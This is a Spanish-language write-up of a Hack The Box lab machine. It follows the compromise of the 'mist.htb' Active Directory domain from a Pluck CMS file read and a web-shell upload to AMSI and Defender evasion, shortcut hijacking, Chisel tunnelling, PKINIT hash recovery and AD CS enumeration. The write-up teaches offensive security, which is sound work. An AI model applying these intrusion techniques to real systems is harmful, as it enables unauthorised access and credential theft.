<p align="center">
<img src="assets/0.png" width="1000">
</p>

El presente documento describe, con un enfoque técnico y metodológico, el compromiso completo de una
infraestructura corporativa basada en Active Directory, articulado a través de múltiples vectores de ataque
que  abarcan  desde  vulnerabilidades  en  servicios  expuestos  hasta  configuraciones  débiles  en  la
infraestructura de certificación (AD CS). El entorno evaluado presenta una arquitectura compleja, en la que
diversas  capas  de  exposición  y  delegación  de  privilegios  permiten  encadenar  técnicas  avanzadas  de
escalada hasta alcanzar control total sobre el controlador de dominio.

El  punto  de  entrada  se  obtuvo  mediante  la  explotación  de  un  servicio  web  público  alojado  en Apache,
afectado  por  una  vulnerabilidad  de  path  traversal  que  permitió  acceder  a  un  archivo  de  respaldo  con
credenciales cifradas. Tras descifrar dichas credenciales, se obtuvo acceso inicial como un usuario web de
bajo privilegio. La presencia de permisos de escritura en un recurso compartido posibilitó la ejecución de
código remoto y la obtención de una sesión interactiva como un usuario del dominio, lo que abrió la puerta
a la enumeración interna del entorno.

A  partir  de  este  acceso,  se  identificaron  múltiples  debilidades  en  la  configuración  de Active  Directory,
incluyendo  LDAP  signing  deshabilitado,  exposición  de  WebDAV,  y  una  serie  de  plantillas  AD  CS
vulnerables  a  ESC13,  que  permitieron  pivotar  entre  identidades  y  servicios  críticos.  Estas  debilidades,
combinadas con técnicas como NTLM relaying, Shadow Credentials, PKINIT, S4U2Self/S4U2Proxy,
y la recuperación de contraseñas de cuentas gMSA, permitieron construir una cadena de escalada progresiva
a través de distintos grupos privilegiados del dominio.

El proceso culminó con la inyección de Shadow Credentials sobre cuentas de servicio críticas, la obtención
del hash NTLM del machine account del controlador de dominio y la ejecución de un ataque DCSync, que
permitió  recuperar  el  hash  del  Domain Administrator.  Con  ello  se  consolidó  el  control  total  sobre  la
infraestructura de Active Directory y se demostró el impacto real de las configuraciones débiles presentes
en el entorno.

<p align="center"><strong><u>Enumeración</u></strong></p>

La dirección IP de la máquina víctima es 10.129.231.20. Por tanto, envié 5 trazas ICMP para verificar que
existe conectividad entre las dos máquinas.

<img src="assets/1.png">

Una vez que identificada la dirección IP de la máquina objetivo, utilicé el comando nmap -p- -sS -sC -sV
--min-rate  5000  -vvv  -Pn  10.129.231.20  -oN  scanner_mist  para  descubrir  los  puertos  abiertos  y  sus
versiones:

- (-p-): realiza un escaneo de todos los puertos abiertos.
- (-sS): utilizado para realizar un escaneo TCP SYN, siendo este tipo de escaneo el más común y rápido, además de ser relativamente sigiloso ya que no llega a completar las conexiones TCP. Habitualmente se conoce esta técnica como sondeo de medio abierto (half open). Este sondeo consiste en enviar un paquete SYN, si recibe un paquete SYN/ACK indica que el puerto está abierto, en caso contrario, si recibe un paquete RST (reset), indica que el puerto está cerrado y si no recibe respuesta, se marca como filtrado.
- (-sC): utiliza los scripts por defecto para descubrir información adicional y posibles vulnerabilidades. Esta opción es equivalente a --script=default. Es necesario tener en cuenta que algunos de estos scripts se consideran intrusivos ya que podría ser detectado por sistemas de detección de intrusiones, por lo que no se deben ejecutar en una red sin permiso.
- (-sV): Activa la detección de versiones. Esto es muy útil para identificar posibles vectores de ataque si la versión de algún servicio disponible es vulnerable. 
- (--min-rate 5000): ajusta la velocidad de envío a 5000 paquetes por segundo.
- (-Pn): asume que la máquina a analizar está activa y omite la fase de descubrimiento de hosts.

<img src="assets/2.png">

El  análisis  inicial  del  servicio  HTTP  revela  la  exposición  del  puerto  80,  donde  se  ejecuta  un  servidor
Apache 2.4.52 desplegado sobre un entorno Windows. La enumeración pasiva y activa del contenido web
permite identificar la presencia del CMS Pluck 4.7.18, cuya superficie de ataque ha sido objeto de diversas
investigaciones de seguridad en los últimos años.

<img src="assets/3.png">

<p align="center"><strong><u>Web Application</u></strong></p>

Durante  la  revisión  de  vulnerabilidades  asociadas  a  esta  versión  específica  del  CMS,  destaca  el
CVE-2023-50564, una falla crítica que afecta al mecanismo de instalación de módulos. Esta vulnerabilidad
se origina en una validación insuficiente de los paquetes suministrados al instalador, lo que posibilita la
inyección de archivos arbitrarios en el sistema subyacente. En escenarios prácticos, dicha debilidad puede
ser  encadenada  para  lograr  ejecución  remota  de  código  (RCE)  mediante  la  manipulación  del  flujo  de
instalación y la introducción de cargas maliciosas en rutas controladas por la aplicación. No obstante, la
explotación efectiva de este vector requiere autenticación previa, lo que condiciona su aplicabilidad en
fases iniciales del compromiso.

Ante esta limitación, se amplió la investigación hacia vulnerabilidades adicionales documentadas por la
comunidad. En este proceso emergió un informe publicado en GitHub, donde se detalla un comportamiento
anómalo del script albums_getimage.php. El análisis del código revela que el parámetro ?image carece de
cualquier mecanismo de verificación que garantice que el recurso solicitado corresponde realmente a un
archivo  de  imagen.  Esta  omisión  habilita  un  escenario  de  lectura  arbitraria  de  archivos,  restringido
exclusivamente  al  árbol  de  directorios  asociado  al  módulo  Albums.  Aunque  no  constituye  una
vulnerabilidad de path traversal tradicional, sí permite acceder a ficheros sensibles siempre que residan
dentro de dicha ruta.

Siguiendo la metodología descrita en la prueba de concepto del repositorio, se procedió a inspeccionar el
directorio /data/settings/modules/albums/ en busca de artefactos potencialmente útiles para la escalada.
Entre los archivos disponibles, admin_backup.php resultó especialmente llamativo.

<img src="assets/4.png">

Mediante el abuso del  endpoint vulnerable, fue  posible  recuperar su  contenido íntegro, exponiendo una
cadena extensa con apariencia de hash criptográfico. Dado que el nombre del archivo sugiere su relación
con configuraciones administrativas, se planteó la hipótesis de que dicho valor pudiera corresponder a una
credencial protegida.

<img src="assets/5.png">

El análisis preliminar mediante hash-identifier permitió clasificarlo como un hash SHA-512, abriendo la
puerta a un proceso de cracking orientado a obtener acceso autenticado al panel de administración.

<img src="assets/6.png">

Una  vez  recuperado  el  hash  SHA-512  procedente  del  archivo  admin_backup.php,  se  procedió  a  su
sometimiento a un proceso de cracking mediante Hashcat, empleando como diccionario la archiconocida
wordlist rockyou.txt. La operación resultó exitosa, revelando que el valor original correspondía a la cadena
lexypoo97, lo que confirma que el archivo contenía efectivamente una credencial administrativa en formato
cifrado.

<img src="assets/7.png">

Con esta información, se accedió al endpoint /login.php, donde el CMS Pluck presenta un mecanismo de
autenticación extremadamente simplificado, basado exclusivamente en la introducción de una contraseña
sin necesidad de usuario asociado. Tras suministrar la credencial recuperada, se obtuvo acceso pleno a la
interfaz administrativa del gestor de contenidos, habilitando así la posibilidad de explotar vectores que
requieren autenticación previa.

<img src="assets/8.png">

En este punto, resultó pertinente retomar el CVE-2023-50564, cuya explotación depende precisamente de
disponer de privilegios administrativos. Esta vulnerabilidad afecta al subsistema de instalación de módulos,
el  cual  carece  de  controles  adecuados  sobre  la  estructura  y  el  contenido  de  los  paquetes  suministrados.
Mediante la construcción de un módulo malicioso —en este caso, un archivo ZIP conteniendo una web
shell  en  PHP  encapsulada  dentro  de  un  directorio—  es  posible  inducir  al  CMS  a  desplegar  archivos
arbitrarios en el directorio /data/modules, lo que deriva en una ejecución remota de código plenamente
funcional.

<img src="assets/9.png">

Para materializar este vector, se generó una web shell en PHP y se empaquetó dentro de un archivo shell.zip,
respetando la estructura esperada por el instalador de módulos. Desde la consola administrativa, se navegó
a Options → Manage modules → Install a module…, donde se procedió a cargar el paquete malicioso.

<img src="assets/10.png">

El  CMS,  al  no  implementar  ningún  mecanismo  de  validación  robusto,  descomprimió  el  contenido  sin
restricciones, creando el directorio /data/modules/shell/ y depositando en su interior el archivo shell.php.

<img src="assets/11.png">

Con el acceso a la interfaz administrativa y la capacidad de desplegar archivos arbitrarios en el servidor, el
siguiente objetivo consistió en obtener una reverse shell plenamente interactiva a través de la web shell
previamente implantada. Para ello, se optó por utilizar un payload en PowerShell, dado que el entorno
subyacente  es Windows  y  este  lenguaje  proporciona  un  canal  nativo,  versátil  y  altamente  flexible  para
establecer comunicaciones inversas.

<img src="assets/12.png">

No obstante, antes de proceder, resultaba imprescindible considerar que el sistema víctima mantenía activas
las protecciones del Antimalware Scan Interface (AMSI), un componente de seguridad diseñado para
inspeccionar  dinámicamente  scripts  y  bloquear  la  ejecución  de  contenido  potencialmente  malicioso.  En
consecuencia, cualquier intento de ejecutar un payload en PowerShell requería mecanismos de evasión
que permitiesen neutralizar o eludir las restricciones impuestas por AMSI, garantizando así la ejecución
íntegra del script sin interferencias.

Tras adaptar el payload con la dirección IP y el puerto del host atacante, se procedió a transferirlo al servidor
comprometido y a desencadenar su ejecución mediante la web shell. Para ello, se emitió una solicitud HTTP
dirigida  al  archivo  shell.php,  invocando  el  comando  necesario  para  lanzar  el  script  de  PowerShell  y
establecer la conexión inversa hacia nuestra máquina de control.

Este proceso permitió consolidar un canal remoto interactivo, habilitando la fase de post-explotación y
proporcionando un punto de apoyo privilegiado para la enumeración del sistema, la elevación de privilegios
y la consolidación del acceso.

<img src="assets/13.png">

<p align="center"><strong><u>Shell as Brandon.Keywarp</u></strong></p>

Tras  consolidar  la  reverse  shell  inicial,  se  procedió  a  una  enumeración  sistemática  del  entorno
comprometido. La ejecución de ipconfig reveló que el host operaba bajo la dirección 192.168.100.101, con
un  gateway  predeterminado  192.168.100.100.  Esta  configuración  sugiere  la  existencia  de  una
infraestructura más amplia, posiblemente segmentada, y apunta a la presencia de otros activos accesibles
desde la máquina comprometida.

La  inspección  del  directorio  C:\Users  aportó  un  indicio  adicional  de  gran  relevancia:  la  existencia  de
múltiples  perfiles  de  usuario  siguiendo  una  convención  de  nombres  característica  de  entornos  Active
Directory.  Este  hallazgo,  unido  al  hostname  del  sistema  —MS01—  refuerza  la  hipótesis  de  que  nos
encontramos  ante  un  dominio  corporativo  plenamente  operativo.  Dado  que  la  cuenta  comprometida,
svc_web, no forma parte del dominio, resultaba evidente la necesidad de obtener acceso a un usuario con
mayor integración en el ecosistema AD para avanzar en la cadena de compromiso.

<img src="assets/14.png">

Durante la enumeración del sistema de archivos, se identificó un directorio inusual en la raíz del volumen
C:\ denominado Common Applications. Su contenido resultó especialmente interesante: una colección de
accesos directos de Windows (.lnk) sobre los cuales el usuario actual disponía de permisos de escritura.
Este vector es particularmente significativo, ya que los accesos directos pueden ser manipulados para alterar
el ejecutable subyacente que invocan, convirtiéndolos en un mecanismo viable para secuestro de ejecución
(execution hijacking).

<img src="assets/15.png">

Una revisión de documentación técnica reveló que los accesos directos pueden ser modificados mediante
PowerShell para redefinir el binario objetivo, permitiendo sustituir la aplicación legítima por un payload
controlado por  el atacante. Siguiendo esta técnica,  se  seleccionó el  acceso directo  Calculator.lnk como
candidato  para  la  sustitución,  configurándolo  para  invocar un  script  de  PowerShell  con  reverse  shell,
análogo al empleado en la fase inicial de compromiso.

<img src="assets/16.png">

Tras un periodo de espera razonable —presumiblemente hasta que un usuario legítimo interactuó con el
acceso directo manipulado— se estableció una nueva conexión en nuestro listener. Esta vez, la sesión se
ejecutaba bajo el contexto del usuario brandon.keywarp, un usuario perteneciente al dominio y, por tanto,
con un nivel de integración significativamente superior dentro del entorno corporativo.

<img src="assets/17.png">

<p align="center"><strong><u>Análisis de Active Directory</u></strong></p>

Con el compromiso de un usuario perteneciente al dominio —brandon.keywarp— se abrió la posibilidad
de realizar una enumeración estructural del entorno Active Directory. Para ello, se optó por emplear
BloodHound, una herramienta ampliamente utilizada para el análisis de relaciones de privilegio, rutas de
ataque y configuraciones delegadas dentro de dominios Windows.

<img src="assets/18.png">

El  primer  paso  consistió  en  transferir  y  ejecutar  SharpHound  en  el  host  comprometido,  con  el  fin  de
recolectar información sobre usuarios, grupos, ACLs, políticas y objetos del dominio. Una vez completada
la fase de recolección, el archivo resultante fue exfiltrado hacia la máquina del atacante utilizando el propio
navegador web, aprovechando la conectividad ya establecida.

<img src="assets/19.png">

Con  los  datos  cargados  en  BloodHound,  se  procedió  a  analizar  las  capacidades  del  usuario
brandon.keywarp dentro del dominio. La enumeración inicial reveló un hallazgo significativo: el usuario,
como miembro del grupo Authenticated Users, posee permisos para solicitar certificados en la Autoridad
Certificadora  MIST-DC01-CA.  Este  tipo  de  permisos  puede  derivar  en  escenarios  de  abuso  de  PKI,
especialmente si existen plantillas de certificado mal configuradas o susceptibles de escalada.

<img src="assets/20.png">

Paralelamente, se identificó un activo adicional aún no analizado: el host 192.168.100.100, previamente
observado como gateway de MS01. Para profundizar en su estudio, se decidió establecer un túnel mediante
Chisel, creando así un canal de comunicación directo entre MS01 y la máquina del atacante. Este enfoque
permite extender la superficie de enumeración hacia segmentos de red inaccesibles desde el exterior.

Antes de proceder con el túnel, resultaba conveniente consolidar un mecanismo de acceso persistente que
facilitara la ejecución de múltiples sesiones, emulando la flexibilidad operativa de un C2. Sin embargo, la
presencia activa de Windows Defender impedía la carga directa de payloads tradicionales. En este punto,
se retomó un  detalle observado en fases previas: cuando  se  desplegó  la  web shell en  PHP, Defender no
intervino  ni  bloqueó  el  archivo.  Este  comportamiento  sugería  la  existencia  de  una  ruta  excluida  en  la
configuración del antivirus.

Una investigación adicional, basada en un procedimiento documentado para enumerar exclusiones desde
un contexto de bajo privilegio, permitió ejecutar un one-liner en PowerShell que confirmó la hipótesis: la
ruta  C:\xampp\htdocs  se  encontraba  explícitamente  excluida  de  las  inspecciones  de  Defender.  Este
descubrimiento constituye un vector de alto valor estratégico, ya que permite introducir artefactos sin ser
sometidos a análisis antimalware, facilitando la persistencia y la ejecución de payloads más complejos en
fases posteriores.

<img src="assets/21.png">

Con  la  ruta  excluida  de  Windows  Defender  ya  identificada,  procedimos  a  cargar  Chisel  en  el  host
comprometido y establecer un túnel inverso entre MS01 y nuestra máquina de control. Este canal permitió
enrutar  tráfico  a  través  del  sistema  comprometido  y  extender  nuestra  superficie  de  enumeración  hacia
segmentos internos de la red.

Una vez operativo el túnel, se ejecutó netexec smb a través de ProxyChains, lo que reveló que el sistema
192.168.100.100  correspondía  al  controlador  de  dominio  del  entorno.  Este  hallazgo  confirmó  la
arquitectura  sospechada  durante  las  fases  iniciales  y  subrayó  la  necesidad  de  obtener  credenciales  o
artefactos que permitieran autenticarnos de forma legítima frente a los servicios del dominio.

<img src="assets/22.png">

Dado  que  la  cuenta  comprometida  brandon.keywarp  pertenece  al  grupo  Domain  Users,  y  que
BloodHound había identificado permisos de certificate enrollment sobre la CA MIST-DC01-CA, se abrió
la  posibilidad  de  explotar  la  infraestructura  de  Active  Directory  Certificate  Services  (AD  CS).  En
particular, si alguna plantilla de certificado admite Client Authentication, es posible solicitar un certificado
válido para el usuario comprometido y emplearlo para obtener su hash NTLM mediante un abuso del flujo
PKINIT del protocolo Kerberos.

La viabilidad de este ataque se fundamenta en el funcionamiento interno de Kerberos. Cuando un cliente
inicia  un  AS-REQ  utilizando  PKINIT,  incluye  su  certificado  en  la  solicitud.  El  KDC  valida  dicho
certificado frente a las plantillas configuradas y, si es legítimo, responde con un AS-REP que contiene el
Ticket-Granting Ticket (TGT). En este modo de autenticación, el session key se cifra con la clave pública
del certificado, lo que permite al cliente recuperarlo descifrando el contenido con su clave privada, que
controlamos al haber generado el certificado.

Este detalle es crucial. Si el cliente inicia posteriormente una solicitud U2U (User-to-User) contra sí mismo
—empleando su propio TGT como ticket adicional— el TGS-REP resultante incluirá el PAC, que contiene,
entre otros atributos, el hash NTLM del usuario. El PAC se cifra con el session key derivado del AS-REP,
por lo que, al poseer la clave privada asociada al certificado, podemos recuperar dicho session key y, en
consecuencia, descifrar el PAC para extraer el hash NTLM.

El primer paso para materializar esta cadena de ataque consiste en identificar una plantilla de certificado
que  permita  Client Authentication  y  que  sea  accesible  para  miembros  de  Domain  Users.  Para  ello,  se
empleó Certify.exe, una herramienta diseñada para auditar configuraciones de AD CS y detectar plantillas
susceptibles de abuso.

```text
PS C:\xampp\htdocs\herramientas> .\Certify.exe find /enrollable

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=mist,DC=htb'

[*] Listing info about the Enterprise CA 'mist-DC01-CA'

    Enterprise CA Name            : mist-DC01-CA
    DNS Hostname                  : DC01.mist.htb
    FullName                      : DC01.mist.htb\mist-DC01-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=mist-DC01-CA, DC=mist, DC=htb
    Cert Thumbprint               : A515DF0E980933BEC55F89DF02815E07E3A7FE5E
    Cert Serial                   : 3BF0F0DDF3306D8E463B218B7DB190F0
    Cert Start Date               : 2/15/2024 7:07:23 AM
    Cert End Date                 : 2/15/2123 7:17:23 AM
    Cert Chain                    : CN=mist-DC01-CA,DC=mist,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
      Allow  ManageCA, ManageCertificates               MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
    Enrollment Agent Restrictions : None

[*] Available Certificates Templates :

    CA Name                               : DC01.mist.htb\mist-DC01-CA
    Template Name                         : User
    Schema Version                        : 1
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Domain Users             S-1-5-21-1045809509-3006658589-2426055941-513
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
      Object Control Permissions
        Owner                       : MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteOwner Principals       : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteDacl Principals        : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteProperty Principals    : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519

    CA Name                               : DC01.mist.htb\mist-DC01-CA
    Template Name                         : EFS
    Schema Version                        : 1
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Encrypting File System
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Domain Users             S-1-5-21-1045809509-3006658589-2426055941-513
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
      Object Control Permissions
        Owner                       : MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteOwner Principals       : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteDacl Principals        : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteProperty Principals    : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519

    CA Name                               : DC01.mist.htb\mist-DC01-CA
    Template Name                         : Administrator
    Schema Version                        : 1
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Microsoft Trust List Signing, Secure Email
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
      Object Control Permissions
        Owner                       : MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteOwner Principals       : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteDacl Principals        : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteProperty Principals    : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519

    CA Name                               : DC01.mist.htb\mist-DC01-CA
    Template Name                         : EFSRecovery
    Schema Version                        : 1
    Validity Period                       : 5 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : File Recovery
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
      Object Control Permissions
        Owner                       : MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteOwner Principals       : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteDacl Principals        : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteProperty Principals    : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519

    CA Name                               : DC01.mist.htb\mist-DC01-CA
    Template Name                         : Machine
    Schema Version                        : 1
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DNS, SUBJECT_REQUIRE_DNS_AS_CN
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Server Authentication
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Domain Computers         S-1-5-21-1045809509-3006658589-2426055941-515
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
      Object Control Permissions
        Owner                       : MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteOwner Principals       : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteDacl Principals        : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteProperty Principals    : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519

    CA Name                               : DC01.mist.htb\mist-DC01-CA
    Template Name                         : WebServer
    Schema Version                        : 1
    Validity Period                       : 2 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : NONE
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Server Authentication
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
      Object Control Permissions
        Owner                       : MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteOwner Principals       : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteDacl Principals        : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteProperty Principals    : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519

    CA Name                               : DC01.mist.htb\mist-DC01-CA
    Template Name                         : SubCA
    Schema Version                        : 1
    Validity Period                       : 5 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : NONE
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : <null>
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
      Object Control Permissions
        Owner                       : MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteOwner Principals       : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteDacl Principals        : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteProperty Principals    : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519

    CA Name                               : DC01.mist.htb\mist-DC01-CA
    Template Name                         : DomainControllerAuthentication
    Schema Version                        : 2
    Validity Period                       : 75 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DNS
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Server Authentication, Smart Card Logon
    mspki-certificate-application-policy  : Client Authentication, Server Authentication, Smart Card Logon
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Domain Controllers       S-1-5-21-1045809509-3006658589-2426055941-516
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
                                      MIST\Enterprise Read-only Domain ControllersS-1-5-21-1045809509-3006658589-2426055941-498
                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
      Object Control Permissions
        Owner                       : MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteOwner Principals       : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteDacl Principals        : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteProperty Principals    : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519

    CA Name                               : DC01.mist.htb\mist-DC01-CA
    Template Name                         : DirectoryEmailReplication
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DIRECTORY_GUID, SUBJECT_ALT_REQUIRE_DNS
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Directory Service Email Replication
    mspki-certificate-application-policy  : Directory Service Email Replication
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Domain Controllers       S-1-5-21-1045809509-3006658589-2426055941-516
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
                                      MIST\Enterprise Read-only Domain ControllersS-1-5-21-1045809509-3006658589-2426055941-498
